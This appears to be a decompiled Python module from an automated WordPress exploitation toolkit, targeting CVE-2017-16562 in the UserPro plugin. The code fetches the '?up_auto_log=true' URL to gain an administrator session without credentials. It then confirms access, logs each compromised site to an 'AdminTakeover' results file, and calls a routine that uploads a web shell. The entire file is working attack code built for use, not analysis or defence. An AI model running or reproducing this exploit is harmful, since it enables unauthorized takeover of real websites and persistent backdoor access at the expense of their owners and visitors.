# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2017_16562userpro.py
import requests
from Exploits import printModule
from Tools import shellupload
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'
   }

def Exploit(site):
    try:
        exploit = '/?up_auto_log=true'
        sess = requests.session()
        sess.get('http://' + site, timeout=10, headers=Headers)
        admin_re_page = 'http://' + site + '/wp-admin/'
        sess.get('http://' + site + exploit, timeout=10, headers=Headers)
        Check_login = sess.get(admin_re_page, timeout=10, headers=Headers)
        if '<li id="wp-admin-bar-logout">' in str(Check_login.content):
            with open('result/AdminTakeover_results.txt', 'a') as writer:
                writer.write(site + exploit + '\n')
            shellupload.UploadshellWordpress(site, sess)
            return printModule.returnYes(site, 'CVE-2017-16562', 'Wordpress Userpro', 'Wordpress')
        return printModule.returnNo(site, 'CVE-2017-16562', 'Wordpress Userpro', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2017-16562', 'Wordpress Userpro', 'Wordpress')